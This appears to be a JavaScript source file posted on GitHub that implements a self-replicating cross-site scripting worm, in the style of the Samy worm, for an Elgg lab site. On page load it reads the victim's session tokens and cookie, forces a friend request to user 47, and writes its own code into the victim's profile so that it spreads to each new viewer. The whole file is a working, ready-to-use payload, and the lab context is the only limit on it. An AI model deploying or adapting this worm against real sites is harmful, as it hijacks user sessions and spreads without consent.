/*
This program was made for a specific cross-site scripting test. The script creates a copy of itself and executes a payload function. Leaving it up on Github for later use.
You want all the comments removed before running the Quine as the backslashes might not be escaped properly.
Author: Sadequs Haque
Last Edited: Nov 13, 2020
*/

<script id=worm>

/*Copying the whole program including the payload and storing it in var strCode */
	var strCode_temp = document.getElementById("worm");
	var bla = "<script id=worm>";	
	var blatwo =bla.concat(strCode_temp.innerHTML);
	var strCode = blatwo.concat("<\/script>");


/*The payload function.
The payload function (as well as the rest of the program) can not have any unencoded special characters. During innitial programming, I had issues with +. Had to replace with str.concat().
Anything not encoded with escape(str) needs to be escaped manually all throughout the program.
*/
    window.onload = function(){

        Ajax = null;
        var temp_url = "http://www.xsslabelgg.com/action/friends/add?friend=47";
        var url = temp_url.concat("&__elgg_ts=",elgg.security.token.__elgg_ts,"&__elgg_token=",elgg.security.token.__elgg_token);
        
        
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",url,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
        if(elgg.session.user.guid!=47){
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
		Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            	Ajax.setRequestHeader("Keep-Alive", "300");
            	Ajax.setRequestHeader("Connection", "keep-alive");
            	Ajax.setRequestHeader("Cookie", document.cookie);
            	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		var temp_content =  "__elgg_token=";
		
		/*The next line uses var strCode, which is a var that stores this program.*/
		var content = temp_content.concat(elgg.security.token.__elgg_token, "&__elgg_ts=",elgg.security.token.__elgg_ts, "&name=", elgg.session.user.name, "&description=", escape(strCode),"&accesslevel[description]=2&briefdescription=Samy is my HERO&accesslevel[briefdescription]=2&guid=",  elgg.session.user.guid);
            	Ajax.send(content);
        }
    }

</script>
